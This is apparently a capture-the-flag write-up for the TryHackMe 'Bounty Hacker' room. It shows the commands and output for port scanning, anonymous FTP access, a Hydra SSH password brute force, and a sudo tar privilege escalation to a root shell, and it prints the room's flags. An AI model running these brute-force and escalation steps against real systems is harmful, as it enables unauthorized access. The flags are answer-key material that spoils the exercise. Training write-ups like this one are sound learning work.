# Bounty-Hacker

## 🚀 Step by step, ooh, baby

### 📋 Pré-requisitos
- Nmap 7.93 (https://nmap.org)
- Hydra v9.4 (https://github.com/vanhauser-thc/thc-hydra)

### 🔧 Execução
```$ nmap -D RND:20 --open -sS -p- <ip>``` <br />
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 21:48 -03 <br />
Nmap scan report for <ip><br />
Host is up (0.23s latency).<br />
Not shown: 56227 filtered tcp ports (no-response), 9305 closed tcp ports (reset)<br />
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit<br />
PORT   STATE SERVICE<br />
21/tcp open  ftp<br />
22/tcp open  ssh<br />
80/tcp open  http<br />

```$ nmap --open -sV -p21,22,80 <ip>```<br />
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-14 21:58 -03<br />
Nmap scan report for <ip><br />
Host is up (0.22s latency).<br />

PORT   STATE SERVICE VERSION<br />
21/tcp open  ftp     vsftpd 3.0.3<br />
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)<br />
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br />
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br />

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br />
Nmap done: 1 IP address (1 host up) scanned in 13.96 seconds<br />

```$ ftp -p 21 <ip>```<br />
anonymous

```$ ls -lha```<br />
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 .<br />
drwxr-xr-x    2 ftp      ftp          4096 Jun 07  2020 ..<br />
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt<br />
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt<br />

```$ get locks.txt```<br />
```$ get task.txt```<br />

```$ cat task.txt```<br />
1.) Protect Vicious.<br />
2.) Plan for Red Eye pickup on the moon.<br />
<br />
-lin<br />

```$ cat locks.txt```<br />
rEddrAGON<br />
ReDdr4g0nSynd!cat3<br />
Dr@gOn$yn9icat3<br />
...<br />

```$ hydra -l lin -P locks.txt <ip> ssh```<br />
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br />

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-05-14 22:04:34<br />
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br />
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task<br />
[DATA] attacking ssh://<ip>:22/<br />
[22][ssh] host: <ip>   login: lin   password: RedDr4gonSynd1cat3<br />
1 of 1 target successfully completed, 1 valid password found<br />
[WARNING] Writing restore file because 1 final worker threads did not complete until end.<br />
[ERROR] 1 target did not resolve or could not be connected<br />
[ERROR] 0 target did not complete<br />
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-05-14 22:04:40<br />

```$ ssh -p 22 lin@<ip>```<br />
RedDr4gonSynd1cat3

```$ ls -lha```<br />
total 12K
drwxr-xr-x  2 lin lin 4.0K Jun  7  2020 .<br />
drwxr-xr-x 19 lin lin 4.0K Jun  7  2020 ..<br />
-rw-rw-r--  1 lin lin   21 Jun  7  2020 user.txt<br />

```$ cat user.txt```<br />
THM{CR1M3_SyNd1C4T3}

```$ sudo -l```<br />
[sudo] password for lin: <br />
Matching Defaults entries for lin on bountyhacker:<br />
    env_reset, mail_badpass,<br />
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin<br />
<br />
User lin may run the following commands on bountyhacker:<br />
    (root) /bin/tar<br />

```$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh```<br />
tar: Removing leading `/' from member names<br />

```$ whoami```<br />
root<br />

```$ ls -lha /root```<br />
total 40K<br />
drwx------  5 root root 4.0K Jun  7  2020 .<br />
drwxr-xr-x 24 root root 4.0K Jun  6  2020 ..<br />
-rw-------  1 root root 2.7K Jun  7  2020 .bash_history<br />
-rw-r--r--  1 root root 3.1K Oct 22  2015 .bashrc<br />
drwx------  2 root root 4.0K Feb 26  2019 .cache<br />
drwxr-xr-x  2 root root 4.0K Jun  7  2020 .nano<br />
-rw-r--r--  1 root root  148 Aug 17  2015 .profile<br />
-rw-r--r--  1 root root   19 Jun  7  2020 root.txt<br />
-rw-r--r--  1 root root   66 Jun  7  2020 .selected_editor<br />
drwx------  2 root root 4.0K Jun  7  2020 .ssh<br />
<br />
```$ cat /root/root.txt```<br />
THM{80UN7Y_h4cK3r}<br />

## 📌 Referências:
- https://tryhackme.com/room/cowboyhacker
- https://gtfobins.github.io/gtfobins/tar/
